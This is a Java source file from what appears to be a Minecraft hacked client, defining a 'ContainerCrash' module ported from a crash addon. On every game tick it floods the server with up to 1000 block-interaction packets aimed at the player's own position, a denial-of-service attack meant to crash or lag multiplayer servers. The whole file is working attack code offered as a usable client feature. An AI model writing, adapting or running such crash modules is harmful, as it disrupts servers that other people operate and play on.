// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class ContainerCrash extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 100, 1, 1000);

    public ContainerCrash() {
        super("ContainerCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        Vec3d pos = mc.player.getPos();
        BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
        for (int i = 0; i < amount.getValue(); i++) {
            mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0));
        }
    }
}
